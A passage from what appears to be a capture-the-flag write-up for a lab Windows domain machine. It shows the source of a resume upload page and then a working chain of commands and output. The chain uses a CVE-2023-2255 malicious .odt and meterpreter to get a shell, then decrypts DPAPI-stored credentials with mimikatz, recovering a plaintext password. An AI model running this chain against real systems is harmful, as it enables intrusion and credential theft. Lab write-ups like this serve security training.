+  $extension = strtolower(end($ext));
+  $filesallowed = array(&#39;docm&#39;,&#39;docx&#39;,&#39;doc&#39;,&#39;odt&#39;);
+    if(in_array($extension,$filesallowed)){
+      if ($fileerr === 0){
+        if ($filesize &lt; 5242880){
+          $ff = &quot;$rewritefn.$extension&quot;;
+          $loc = &quot;applications/&quot;.$ff;
+            if(move_uploaded_file($filetmp,$loc))
+            {
+              // upload successful
+              $notifi=&quot;&lt;span class=notifi&gt;✔ Upload Successful!&lt;/span&gt;&lt;hr/&gt;&lt;style&gt;
+                button, input , select, option, h3{
+                        display:none;
+                }
+                &lt;/style&gt;&quot;;
+          } else {
+echo $loc;
+          $notifi=&quot;&lt;span class=notifi&gt;✖  Something Went Wrong! Unable To upload the Resume!&lt;/span&gt;&lt;hr/&gt;&quot;;
+          }
+        
+        } else {
+          
+          $notifi=&quot;&lt;span class=notifi&gt;⚠  Your Resume should be less than 5MB!&lt;/span&gt;&lt;hr/&gt;&quot;;
+        }
+      
+      } else {
+    $notifi=&quot;&lt;span class=notifi&gt;✖  Corrupted File/Unable to Upload!&lt;/span&gt;&lt;hr/&gt;&quot;;
+      }
+    
+    } else {
+    $notifi=&quot;&lt;span class=notifi&gt;❌ Accepted File Types : Doc, Docx, Docm, Odt!&lt;/span&gt;&lt;hr/&gt;&quot;;
+    }
+}
+?&gt;
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+  &lt;meta charset=&quot;UTF-8&quot;&gt;
+        &lt;link rel=&quot;shortcut icon&quot; href=&quot;https://www.pinclipart.com/picdir/big/344-3445944_png-file-svg-terminal-icon-png-clipart.png&quot;&gt;
+  &lt;title&gt;Resume Submission&lt;/title&gt;
+  &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+&lt;style type=&quot;text/css&quot;&gt;
+body{
+height:100%;
+overflow:auto;
+}
+.notifi{
+font-weight:bold;
+padding:0px;
+}
+.notifi hr{
+background:#000000;
+height:2px;
+}
+.magic{
+margin-top:0.5%;
+max-height:90%;
+max-width:90%;
+border: 2px solid #000000;
+}
+.inpstylef{
+border-bottom: 2px solid #000000;
+padding:0.5%;
+font-size:14px;
+font-weight:bold;
+}
+.inputstyle ,.inpstyles {
+width:69%;
+height:35px;
+border:2px solid #000000;
+}
+.inpstylef::-webkit-file-upload-button {
+  visibility: hidden;
+}
+.inpstylef::before {
+  content: &#39;  &#39;;
+  display: inline-block;
+  border: 1px solid #999;
+  border-radius: 3px;
+  padding: 5px 8px;
+  outline: none;
+  white-space: nowrap;
+  -webkit-user-select: none;
+  cursor: pointer;
+  text-shadow: 1px 1px #fff;
+  font-weight: 700;
+  font-size: 10pt;
+}
+::placeholder{
+color:#151715;
+opacity:1;
+font-weight:bold;
+}
+.magic h3{
+    text-align: left;
+    padding-left: 260px;
+
+}
+&lt;/style&gt;  
+&lt;/head&gt;
+&lt;body&gt;
+  &lt;center&gt;
+    &lt;div class=&quot;magic&quot;&gt;
+      &lt;h1&gt; Job Application Submission&lt;/h1&gt;
+        &lt;hr style=&quot;width:inherit;padding:0px;height:2px; background:#000000&quot;/&gt;
+        &lt;span class=&quot;notifi&quot;&gt;&lt;?php echo &quot;$notifi&quot;; ?&gt;&lt;/span&gt;
+      &lt;form action=&quot;&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;
+        &lt;h3&gt;Full Name:&lt;/h3&gt;
+        &lt;input class=&quot;inputstyle&quot; type=&quot;text&quot; name=&quot;fullname&quot; placeholder=&quot;Example : John Doe&quot; required&gt;
+        &lt;h3&gt;Email:&lt;/h3&gt;
+        &lt;input class=&quot;inputstyle&quot; type=&quot;email&quot; name=&quot;email&quot; placeholder=&quot; Example : xxx123@xyz.abc&quot; required&gt;
+        &lt;h3&gt;Work Experience&lt;/h3&gt;
+        &lt;select id=&quot;&quot; style=&quot;background:#151715; color:#ffffff; font-weight:bold&quot;  class=&quot;inpstyles&quot; name=&quot;experience&quot; required&gt;
+          &lt;option class=&quot;inpstyl&quot;&gt;0-5 years&lt;/option&gt;
+          &lt;option class=&quot;inpstyl&quot;&gt;10-20 years&lt;/option&gt;
+          &lt;option class=&quot;inpstyl&quot;&gt;20-30 years&lt;/option&gt;
+        &lt;/select&gt;&lt;br/&gt;      
+          &lt;h3&gt;Requested Salary&lt;/h3&gt;
+        &lt;select id=&quot;&quot; class=&quot;inpstyles&quot; style=&quot;background:#151715; color:#ffffff; font-weight:bold&quot; name=&quot;salary&quot; required&gt;
+          &lt;option value=&quot;30 000&quot; class=&quot;inpstyl&quot;&gt;30 000$&lt;/option&gt;
+          &lt;option value=&quot;60 000&quot; class=&quot;inpstyl&quot;&gt;60 000$&lt;/option&gt;
+          &lt;option value=&quot;80 000&quot; class=&quot;inpstyl&quot;&gt;80 000$&lt;/option&gt;
+          &lt;option value=&quot;100 000&quot; class=&quot;inpstyl&quot;&gt;100 000$&lt;/option&gt;
+          &lt;option value=&quot;200 000&quot; class=&quot;inpstyl&quot;&gt;200 000$&lt;/option&gt;
+          &lt;option value=&quot;300 000&quot; class=&quot;inpstyl&quot;&gt;300 000$&lt;/option&gt;
+        &lt;/select&gt;&lt;br/&gt;&lt;br/&gt;
+          &lt;h3&gt;Choose Your Department&lt;/h3&gt;
+        &lt;select id=&quot;&quot; class=&quot;inpstyles&quot;style=&quot;background:#151715; color:#ffffff; font-weight:bold&quot;  name=&quot;department&quot; required&gt;
+          &lt;option value=&quot;IT&quot; class=&quot;inpstyl&quot;&gt;IT&lt;/option&gt;
+          &lt;option value=&quot;Sales&quot; class=&quot;inpstyl&quot;&gt;Sales&lt;/option&gt;
+          &lt;option value=&quot;Management&quot; class=&quot;inpstyl&quot;&gt;Management&lt;/option&gt;
+        &lt;/select&gt; 
+        &lt;br&gt;
+        &lt;br&gt;&lt;div style=&quot;display:flex; flex-direction:column;  align-items: center;justify-content: center;&quot;&gt;
+          &lt;h3 style=&quot;padding-left:50px&quot; &gt;Upload Resume:&lt;/h3&gt;
+        &lt;input id=&quot;&quot; class=&quot;inpstylef&quot; type=&quot;file&quot; name=&quot;assignment&quot;&gt;&lt;/div&gt;
+        &lt;br&gt;
+        &lt;br&gt;
+        &lt;br&gt;
+        &lt;button type=&quot;submit&quot; style=&quot;margin-bottom:15px; color:#ffffff; background:#151715; width:50%; font-weight:bold ;height:35px&quot; name=&quot;submit&quot;&gt;Upload Resume&lt;/button&gt;
+      &lt;/form&gt;
+    &lt;/div&gt;
+  &lt;/center&gt;
+  
+&lt;/body&gt;
+&lt;/html&gt;
+</div>
+<p>
+  It seems that we can upload a resume on this web application. It accepts .docm, .docx, .doc and .odt file extensions. There is a vulnerability affecting LibreOffice 
+  prior to 7.4. If the resume we send is opened using a vulnerable version of LibreOffice by another user, we could trigger a Remote Code Execution and gain access to another 
+  user account. We can check the installed LibreOffice version using a Metasploit Framework module or by querying the registry like so :
+</p>
+<div class="codeBlock">C:\Program Files\LibreOffice 5&gt;REG QUERY HKLM\Software\LibreOffice\LibreOffice
+$REG QUERY HKLM\Software\LibreOffice\LibreOffice
+
+HKEY_LOCAL_MACHINE\Software\LibreOffice\LibreOffice\5.2
+</div>
+<h2 id="privilege-escalation-ppotts">Privilege escalation (ppotts)</h2>
+<p>
+  The installed version of LibreOffice is 5.2 so it should be vulnerable. We can use <a href="https://github.com/elweth-sec/CVE-2023-2255">this</a> exploit to generate a 
+  malicious .odt :
+</p>
+<div class="codeBlock">┌──(cyberretta㉿kali-laptop)-[~/…/Hard/Office/exploits/CVE-2023-2255]
+└─$ python3 CVE-2023-2255.py --cmd &quot;C:/Windows/Temp/m2.exe&quot;
+File output.odt has been created !
+</div>
+<p>Now, we need to find the port where this web application is running :</p>
+<div class="codeBlock">meterpreter &gt; netstat
+
+Connection list
+===============
+    tcp6   :::80              :::*               LISTEN       0     0      2704/httpd.exe
+    tcp6   :::88              :::*               LISTEN       0     0      652/lsass.exe
+    tcp6   :::135             :::*               LISTEN       0     0      900/svchost.exe
+    tcp6   :::443             :::*               LISTEN       0     0      2704/httpd.exe
+    tcp6   :::445             :::*               LISTEN       0     0      4/System
+    tcp6   :::464             :::*               LISTEN       0     0      652/lsass.exe
+    tcp6   :::593             :::*               LISTEN       0     0      900/svchost.exe
+    tcp6   :::3306            :::*               LISTEN       0     0      772/mysqld.exe
+    tcp6   :::3389            :::*               LISTEN       0     0      344/svchost.exe
+    tcp6   :::5985            :::*               LISTEN       0     0      4/System
+    tcp6   :::8083            :::*               LISTEN       0     0      2704/httpd.exe
+    tcp6   :::9389            :::*               LISTEN       0     0      2860/Microsoft.ActiveDirectoy
+</div>
+<p>There is a web application running on port 8083. We can use curl to check if it’s the web application we are looking for or not :</p>
+<div class="codeBlock">meterpreter &gt; shell
+Process 5616 created.
+Channel 1 created.
+Microsoft Windows [Version 10.0.20348.2322]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\xampp\htdocs\internal\applications&gt;curl http://localhost:8083/
+curl http://localhost:8083/
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                  Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0&lt;!doctype html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+  &lt;head&gt;
+    &lt;!-- Required meta tags --&gt;
+    &lt;meta charset=&quot;utf-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1, shrink-to-fit=no&quot;&gt;
+
+    &lt;!-- Bootstrap CSS --&gt;
+    &lt;link rel=&quot;stylesheet&quot; href=&quot;css/squarely.css&quot;&gt;
+    &lt;!--common.css  --&gt;
+      &lt;link rel=&quot;stylesheet&quot; href=&quot;css/common.css&quot;&gt;
+    &lt;title&gt;Holography Industries&lt;/title&gt;
+  &lt;/head&gt;
+  &lt;body&gt;
+  &lt;!--navbar --&gt;
+    &lt;nav class=&quot;navbar navbar-expand-lg navbar-dark bg-primary&quot;&gt;
+      &lt;a class=&quot;navbar-brand&quot; href=&quot;#&quot;&gt;Business&lt;/a&gt;
+      &lt;button class=&quot;navbar-toggler&quot; type=&quot;button&quot; data-toggle=&quot;collapse&quot; data-target=&quot;#navbarNav&quot; aria-controls=&quot;navbarNav&quot; aria-expanded=&quot;false&quot; aria-label=&quot;Toggle navigation&quot;&gt;
+        &lt;span class=&quot;navbar-toggler-icon&quot;&gt;&lt;/span&gt;
+      &lt;/button&gt;
+      &lt;div class=&quot;collapse navbar-collapse&quot; id=&quot;navbarNav&quot;&gt;
+        &lt;ul class=&quot;navbar-nav ml-auto&quot;&gt;
+          &lt;li class=&quot;nav-item active&quot;&gt;
+            &lt;a class=&quot;nav-link&quot; href=&quot;#&quot;&gt;Home &lt;span class=&quot;sr-only&quot;&gt;(current)&lt;/span&gt;&lt;/a&gt;
+          &lt;/li&gt;
+          &lt;li class=&quot;nav-item&quot;&gt;
+            &lt;a class=&quot;nav-link&quot; href=&quot;resume.php&quot;&gt;Submit Application&lt;/a&gt;
+          &lt;/li&gt;
+          &lt;li class=&quot;nav-item&quot;&gt;
+            &lt;a class=&quot;nav-link&quot; href=&quot;#&quot;&gt;Services&lt;/a&gt;
+          &lt;/li&gt;
+          &lt;li class=&quot;nav-item&quot;&gt;
+            &lt;a class=&quot;nav-link&quot; href=&quot;#&quot;&gt;About&lt;/a&gt;
+          &lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/div&gt;
+    &lt;/nav&gt;
+
+    &lt;div class=&quot;hero-header&quot; style=&quot;background-image: url(&#39;img/business.jpg&#39;)&quot;&gt;
+        &lt;div class=&quot;header&quot;&gt;
+            &lt;h1&gt;Holography Industries&lt;/h1&gt;
+            &lt;p&gt;World leader in Holographic Technologies&lt;/p&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+
+    &lt;!--main content--&gt;
+    &lt;div class=&quot;container mb-4 mt-4&quot;&gt;
+        &lt;div class=&quot;row&quot;&gt;
+            &lt;div class=&quot;col-md-8 mb-3&quot;&gt;
+                &lt;h2&gt;About us&lt;/h2&gt;
+                &lt;hr&gt;
+                &lt;p&gt;We are all incredibly passionated about holograms at Holography Industries. We strongly believe that we are contributing to a brighter future for humanity.&lt;/p&gt;
+                &lt;p&gt;Life&#39;s all about evolution : And we are doing just that.&lt;/p&gt;
+                &lt;a href=&quot;#&quot; class=&quot;btn btn-primary&quot;&gt;Make a Phone call&lt;/a&gt;
+            &lt;/div&gt;
+            &lt;div class=&quot;col-md-4 align-items-center d-md-flex&quot;&gt;
+                &lt;img class=&quot;img-fluid&quot; src=&quot;img/girl.jpg&quot; alt=&quot;lapi_girl&quot;&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+
+        &lt;!--3 cards--&gt;
+    &lt;div class=&quot;container-fluid mb-4&quot;&gt;
+        &lt;div class=&quot;row bg-light p-md-5&quot;&gt;
+            &lt;div class=&quot;col-md-4 mb-3&quot;&gt;
+                &lt;div class=&quot;card&quot;&gt;
+                    &lt;img class=&quot;card-img-top&quot; src=&quot;img/1.jpg&quot; alt=&quot;&quot;&gt;
+                    &lt;div class=&quot;card-body&quot;&gt;
+                        &lt;h3&gt;Know more about us&lt;/h3&gt;
+                        &lt;p&gt;Our Offices are currently all located in New York. If you would like to work with us, pay us a visit!&lt;/p&gt;
+                    &lt;/div&gt;
+                    &lt;div class=&quot;card-footer&quot;&gt;
+                        &lt;button class=&quot;btn btn-primary&quot;&gt;Find out more!&lt;/button&gt;
+                    &lt;/div&gt;
+                &lt;/div&gt;
+            &lt;/div&gt;
+            &lt;div class=&quot;col-md-4 mb-3&quot;&gt;
+                &lt;div class=&quot;card&quot;&gt;
+                    &lt;img class=&quot;card-img-top&quot; src=&quot;img/2.jpg&quot; alt=&quot;&quot;&gt;
+                    &lt;div class=&quot;card-body&quot;&gt;
+                        &lt;h3&gt;What we do?&lt;/h3&gt;
+                        &lt;p&gt;Just a bunch of passionate engineers trying to make the world a better place for everyone!&lt;/p&gt;
+                    &lt;/div&gt;
+                    &lt;div class=&quot;card-footer&quot;&gt;
+                        &lt;button class=&quot;btn btn-primary&quot;&gt;Find out more!&lt;/button&gt;
+                    &lt;/div&gt;
+                &lt;/div&gt;
+            &lt;/div&gt;
+            &lt;div class=&quot;col-md-4 mb-3&quot;&gt;
+                &lt;div class=&quot;card&quot;&gt;
+                    &lt;img class=&quot;card-img-top&quot; src=&quot;img/3.jpg&quot; alt=&quot;&quot;&gt;
+                    &lt;div class=&quot;card-body&quot;&gt;
+                        &lt;h3&gt;Contact Us&lt;/h3&gt;
+                        &lt;p&gt;You can either contact us by email or by phone. HolographyTech@HolographyTechnologies.htb | 514-000-000&lt;/p&gt;
+                    &lt;/div&gt;
+                    &lt;div class=&quot;card-footer&quot;&gt;
+100  5113  100  5113    0     0   101k      0 --:--:-- --:--:-- --:--:--  101k
+utton class=&quot;btn btn-primary&quot;&gt;Find out more!&lt;/button&gt;
+                    &lt;/div&gt;
+                &lt;/div&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+
+    &lt;!--footer--&gt;
+    &lt;div class=&quot;py-3 bg-light text-center&quot;&gt;
+        &lt;p class=&quot;m-0&quot;&gt;Copyright By &lt;a href=&quot;#&quot;&gt;holographictech.htb&lt;/a&gt; 2030&lt;/p&gt;
+    &lt;/div&gt;
+    &lt;!-- Optional JavaScript --&gt;
+    &lt;!-- jQuery first, then Popper.js, then Bootstrap JS --&gt;
+    &lt;script src=&quot;https://code.jquery.com/jquery-3.3.1.slim.min.js&quot; integrity=&quot;sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo&quot; crossorigin=&quot;anonymous&quot;&gt;&lt;/script&gt;
+    &lt;script src=&quot;https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js&quot; integrity=&quot;sha384-UO2eT0CpHqdSJQ6hJty5KVphtPhzWj9WO1clHTMGa3JDZwrnQq4sF86dIHNDz0W1&quot; crossorigin=&quot;anonymous&quot;&gt;&lt;/script&gt;
+    &lt;script src=&quot;https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js&quot; integrity=&quot;sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM&quot; crossorigin=&quot;anonymous&quot;&gt;&lt;/script&gt;
+  &lt;/body&gt;
+&lt;/html&gt;
+</div>
+<p>It is the web application we are looking for. Now, we need to port forward this port in order to send our malicious resume to this web application :</p>
+<div class="codeBlock">meterpreter &gt; portfwd add -l 8083 -p 8083 -r 127.0.0.1
+[*] Forward TCP relay created: (local) :8083 -&gt; (remote) 127.0.0.1:8083
+</div>
+<p>Now, we should have access to this web application using our web browser :</p>
+<img src="/write-ups/HackTheBox/Hard/Office/Untitled 5.png" alt="Untitled">
+<p>We going to Submit Application at the top of the index page, we are redirected to this web page :</p>
+<img src="/write-ups/HackTheBox/Hard/Office/Untitled 6.png" alt="Untitled">
+<p>Now, we can upload our malicious .odt file. After waiting some time, the command should be executed and we should receive a connection on our listener :</p>
+<div class="codeBlock">meterpreter &gt; getuid
+Server username: OFFICE\ppotts
+</div>
+<p>We now have a shell as ppotts.</p>
+<h2 id="privilege-escalation-hhogan">Privilege escalation (hhogan)</h2>
+<p>Let’s see if there is stored credentials on the system :</p>
+<div class="codeBlock">meterpreter &gt; shell
+Process 4360 created.
+Channel 2 created.
+Microsoft Windows [Version 10.0.20348.2322]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Program Files\LibreOffice 5\program&gt;cmdkey /list
+cmdkey /list
+
+Currently stored credentials:
+
+    Target: LegacyGeneric:target=MyTarget
+    Type: Generic 
+    User: MyUser
+    
+    Target: Domain:interactive=office\hhogan
+    Type: Domain Password
+    User: office\hhogan
+</div>
+<p>There is stored credentials for hhogan user. We can list credentials like so :</p>
+<div class="codeBlock">C:\Users\PPotts\Documents\mimikatz\mimikatz\x64&gt;dir /a C:\Users\ppotts\AppData\Roaming\Microsoft\Credentials\ 
+dir /a C:\Users\ppotts\AppData\Roaming\Microsoft\Credentials\
+  Volume in drive C has no label.
+  Volume Serial Number is C626-9388
+
+  Directory of C:\Users\ppotts\AppData\Roaming\Microsoft\Credentials
+
+05/09/2023  03:14 PM    &lt;DIR&gt;          .
+01/18/2024  09:34 AM    &lt;DIR&gt;          ..
+05/09/2023  01:08 PM               358 18A1927A997A794B65E9849883AC3F3E
+05/09/2023  03:03 PM               398 84F1CAEEBF466550F4967858F9353FB4
+01/18/2024  11:53 AM               374 E76CCA3670CD9BB98DF79E0A8D176F1E
+                3 File(s)          1,130 bytes
+                2 Dir(s)   4,252,430,336 bytes free
+</div>
+<p>Let’s see what credentials are stored in 84F1CAEEBF466550F4967858F9353FB4 :</p>
+<div class="codeBlock">C:\Windows\Temp\mimikatz\mimikatz\x64&gt;.\mimikatz.exe
+.\mimikatz.exe
+
+  .#####.   mimikatz 2.2.0 (x64) #18362 Feb 29 2020 11:13:36
+  .## ^ ##.  &quot;A La Vie, A L&#39;Amour&quot; - (oe.eo)
+  ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+  ## \ / ##       &gt; http://blog.gentilkiwi.com/mimikatz
+  &#39;## v ##&#39;       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  &#39;#####&#39;        &gt; http://pingcastle.com / http://mysmartlogon.com   ***/
+
+mimikatz # dpapi::cred /in:&quot;C:\Users\ppotts\AppData\Roaming\Microsoft\Credentials\84F1CAEEBF466550F4967858F9353FB4
+**BLOB**
+  dwVersion          : 00000001 - 1
+  guidProvider       : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb}
+  dwMasterKeyVersion : 00000001 - 1
+  guidMasterKey      : {191d3f9d-7959-4b4d-a520-a444853c47eb}
+  dwFlags            : 20000000 - 536870912 (system ; )
+  dwDescriptionLen   : 0000003a - 58
+  szDescription      : Enterprise Credential Data
+
+  algCrypt           : 00006603 - 26115 (CALG_3DES)
+  dwAlgCryptLen      : 000000c0 - 192
+  dwSaltLen          : 00000010 - 16
+  pbSalt             : 649c4466d5d647dd2c595f4e43fb7e1d
+  dwHmacKeyLen       : 00000000 - 0
+  pbHmackKey         : 
+  algHash            : 00008004 - 32772 (CALG_SHA1)
+  dwAlgHashLen       : 000000a0 - 160
+  dwHmac2KeyLen      : 00000010 - 16
+  pbHmack2Key        : 32e88dfd1927fdef0ede5abf2c024e3a
+  dwDataLen          : 000000c0 - 192
+  pbData             : f73b168ecbad599e5ca202cf9ff719ace31cc92423a28aff5838d7063de5cccd4ca86bfb2950391284b26a34b0eff2dbc9799bdd726df9fad9cb284bacd7f1ccbba0fe140ac16264896a810e80cac3b68f82c80347c4deaf682c2f4d3be1de025f0a68988fa9d633de943f7b809f35a141149ac748bb415990fb6ea95ef49bd561eb39358d1092aef3bbcc7d5f5f20bab8d3e395350c711d39dbe7c29d49a5328975aa6fd5267b39cf22ed1f9b933e2b8145d66a5a370dcf76de2acdf549fc97
+  dwSignLen          : 00000014 - 20
+  pbSign             : 21bfb22ca38e0a802e38065458cecef00b450976
+</div>
+<p>We need the master key in order to decrypt the credentials. Let’s try to find the master key location according to the guidProvider we just found :</p>
+<div class="codeBlock">meterpreter &gt; dir
+Listing: C:\Users\ppotts\AppData\Roaming\Microsoft\Protect
+==========================================================
+
+Mode              Size  Type  Last modified              Name
+----              ----  ----  -------------              ----
+100666/rw-rw-rw-  24    fil   2023-05-03 01:13:34 +0200  CREDHIST
+040777/rwxrwxrwx  4096  dir   2024-01-18 00:43:56 +0100  S-1-5-21-1199398058-4196589450-691661856-1107
+100666/rw-rw-rw-  76    fil   2024-01-18 01:06:25 +0100  SYNCHIST
+
+Path
+----
+C:\Users\ppotts\AppData\Roaming\Microsoft\Protect
+
+PS &gt; cd S-1-5-21-1199398058-4196589450-691661856-1107
+PS &gt; ls -h
+
+  
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a-hs-         1/17/2024   3:43 PM            740 10811601-0fa9-43c2-97e5-9bef8471fc7d
+-a-hs-          5/2/2023   4:13 PM            740 191d3f9d-7959-4b4d-a520-a444853c47eb
+-a-hs-          5/2/2023   4:13 PM            900 BK-OFFICE
+-a-hs-         1/17/2024   3:43 PM             24 Preferred
+</div>
+<p>We can load the master key in cache like so :</p>
+<div class="codeBlock">mimikatz # dpapi::masterkey /in:&quot;C:\Users\ppotts\AppData\Roaming\Microsoft\Protect\S-1-5-21-1199398058-4196589450-691661856-1107\191d3f9d-7959-4b4d-a520-a444853c47eb&quot; /rpc
+**MASTERKEYS**
+  dwVersion          : 00000002 - 2
+  szGuid             : {191d3f9d-7959-4b4d-a520-a444853c47eb}
+  dwFlags            : 00000000 - 0
+  dwMasterKeyLen     : 00000088 - 136
+  dwBackupKeyLen     : 00000068 - 104
+  dwCredHistLen      : 00000000 - 0
+  dwDomainKeyLen     : 00000174 - 372
+[masterkey]
+  **MASTERKEY**
+    dwVersion        : 00000002 - 2
+    salt             : c521daa0857ee4fa6e4246266081e94c
+    rounds           : 00004650 - 18000
+    algHash          : 00008009 - 32777 (CALG_HMAC)
+    algCrypt         : 00006603 - 26115 (CALG_3DES)
+    pbKey            : 1107e1ab3e107528a73a2dafc0a2db28de1ea0a07e92cff03a935635013435d75e41797f612903d6eea41a8fc4f7ebe8d2fbecb0c74cdebb1e7df3c692682a066faa3edf107792d116584625cc97f0094384a5be811e9d5ce84e5f032704330609171c973008d84f
+
+[backupkey]
+  **MASTERKEY**
+    dwVersion        : 00000002 - 2
+    salt             : a2741b13d7261697be4241ebbe05098a
+    rounds           : 00004650 - 18000
+    algHash          : 00008009 - 32777 (CALG_HMAC)
+    algCrypt         : 00006603 - 26115 (CALG_3DES)
+    pbKey            : 21bf24763fbb1400010c08fccc5423fe7da8190c61d3006f2d5efd5ea586f463116805692bae637b2ab548828b3afb9313edc715edd11dc21143f4ce91f4f67afe987005320d3209
+
+[domainkey]
+  **DOMAINKEY**
+    dwVersion        : 00000002 - 2
+    dwSecretLen      : 00000100 - 256
+    dwAccesscheckLen : 00000058 - 88
+    guidMasterKey    : {e523832a-e126-4d6e-ac04-ed10da72b32f}
+    pbSecret         : 159613bdc2d90dd4834a37e29873ce04c74722a706d0ba4770865039b3520ff46cf9c9281542665df2e72db48f67e16e2014e07b88f8b2f7d376a8b9d47041768d650c20661aee31dc340aead98b7600662d2dc320b4f89cf7384c2a47809c024adf0694048c38d6e1e3e10e8bd7baa7a6f1214cd3a029f8372225b2df9754c19e2ae4bc5ff4b85755b4c2dfc89add9f73c54ac45a221e5a72d3efe491aa6da8fb0104a983be20af3280ae68783e8648df413d082fa7d25506e9e6de1aadbf9cf93ec8dfc5fab4bfe1dd1492dbb679b1fa25c3f15fb8500c6021f518c74e42cd4b5d5d6e1057f912db5479ebda56892f346b4e9bf6404906c7cd65a54eea2842
+    pbAccesscheck    : 1430b9a3c4ab2e9d5f61dd6c62aab8e1742338623f08461fe991cccd5b3e4621d4c8e322650460181967c409c20efcf02e8936c007f7a506566d66ba57448aa8c3524f0b9cf881afcbb80c9d8c341026f3d45382f63f8665
+
+Auto SID from path seems to be: S-1-5-21-1199398058-4196589450-691661856-1107
+
+[domainkey] with RPC
+[DC] &#39;office.htb&#39; will be the domain
+[DC] &#39;DC.office.htb&#39; will be the DC server
+  key : 87eedae4c65e0db47fcbc3e7e337c4cce621157863702adc224caf2eedcfbdbaadde99ec95413e18b0965dcac70344ed9848cd04f3b9491c336c4bde4d1d8166
+  sha1: 85285eb368befb1670633b05ce58ca4d75c73c77
+</div>
+<p>Now, if we check the cached master keys we should have the master key used to decrypt the stored credentials for hhogan user account :</p>
+<div class="codeBlock">mimikatz # dpapi::cache
+
+CREDENTIALS cache
+=================
+
+MASTERKEYS cache
+================
+GUID:{191d3f9d-7959-4b4d-a520-a444853c47eb};KeyHash:85285eb368befb1670633b05ce58ca4d75c73c77
+
+DOMAINKEYS cache
+================
+</div>
+<p>Finally, we can decrypt the stored credentials :</p>
+<div class="codeBlock">mimikatz # dpapi::cred /in:&quot;C:\Users\ppotts\AppData\Roaming\Microsoft\Credentials\84F1CAEEBF466550F4967858F9353FB4&quot;
+**BLOB**
+  dwVersion          : 00000001 - 1
+  guidProvider       : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb}
+  dwMasterKeyVersion : 00000001 - 1
+  guidMasterKey      : {191d3f9d-7959-4b4d-a520-a444853c47eb}
+  dwFlags            : 20000000 - 536870912 (system ; )
+  dwDescriptionLen   : 0000003a - 58
+  szDescription      : Enterprise Credential Data
+
+  algCrypt           : 00006603 - 26115 (CALG_3DES)
+  dwAlgCryptLen      : 000000c0 - 192
+  dwSaltLen          : 00000010 - 16
+  pbSalt             : 649c4466d5d647dd2c595f4e43fb7e1d
+  dwHmacKeyLen       : 00000000 - 0
+  pbHmackKey         : 
+  algHash            : 00008004 - 32772 (CALG_SHA1)
+  dwAlgHashLen       : 000000a0 - 160
+  dwHmac2KeyLen      : 00000010 - 16
+  pbHmack2Key        : 32e88dfd1927fdef0ede5abf2c024e3a
+  dwDataLen          : 000000c0 - 192
+  pbData             : f73b168ecbad599e5ca202cf9ff719ace31cc92423a28aff5838d7063de5cccd4ca86bfb2950391284b26a34b0eff2dbc9799bdd726df9fad9cb284bacd7f1ccbba0fe140ac16264896a810e80cac3b68f82c80347c4deaf682c2f4d3be1de025f0a68988fa9d633de943f7b809f35a141149ac748bb415990fb6ea95ef49bd561eb39358d1092aef3bbcc7d5f5f20bab8d3e395350c711d39dbe7c29d49a5328975aa6fd5267b39cf22ed1f9b933e2b8145d66a5a370dcf76de2acdf549fc97
+  dwSignLen          : 00000014 - 20
+  pbSign             : 21bfb22ca38e0a802e38065458cecef00b450976
+
+Decrypting Credential:
+  * volatile cache: GUID:{191d3f9d-7959-4b4d-a520-a444853c47eb};KeyHash:85285eb368befb1670633b05ce58ca4d75c73c77
+**CREDENTIAL**
+  credFlags      : 00000030 - 48
+  credSize       : 000000be - 190
+  credUnk0       : 00000000 - 0
+
+  Type           : 00000002 - 2 - domain_password
+  Flags          : 00000000 - 0
+  LastWritten    : 5/9/2023 11:03:21 PM
+  unkFlagsOrSize : 00000018 - 24
+  Persist        : 00000003 - 3 - enterprise
+  AttributeCount : 00000000 - 0
+  unk0           : 00000000 - 0
+  unk1           : 00000000 - 0
+  TargetName     : Domain:interactive=OFFICE\HHogan
+  UnkData        : (null)
+  Comment        : (null)
+  TargetAlias    : (null)
+  UserName       : OFFICE\HHogan
+  CredentialBlob : H4ppyFtW183#
+  Attributes     : 0
+</div>
+<p>We now have the credentials for hhogan user account. We can check if this user is a member of the Remote User Management group to directly login via the WinRM service :</p>
+<div class="codeBlock">C:\Windows\Temp&gt;net user hhogan
+net user hhogan
+User name                    HHogan
+Full Name                    
+Comment                      
+User&#39;s comment               
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            5/6/2023 10:59:34 AM
+Password expires             Never
+Password changeable          5/7/2023 10:59:34 AM
+Password required            Yes
+User may change password     Yes
+
+Workstations allowed         All
+Logon script                 
+User profile                 
+Home directory               
+Last logon                   5/10/2023 4:30:58 AM
+
+Logon hours allowed          All
+
+Local Group Memberships      *Remote Management Use
+Global Group memberships     *Domain Users         *GPO Managers         
+The command completed successfully.
+</div>
+<p>He is. So, we can use evil-winrm to gain access to the system as hhogan :</p>
+<div class="codeBlock">┌──(cyberretta㉿kali-laptop)-[~/…/Machines/Hard/Office/loot]
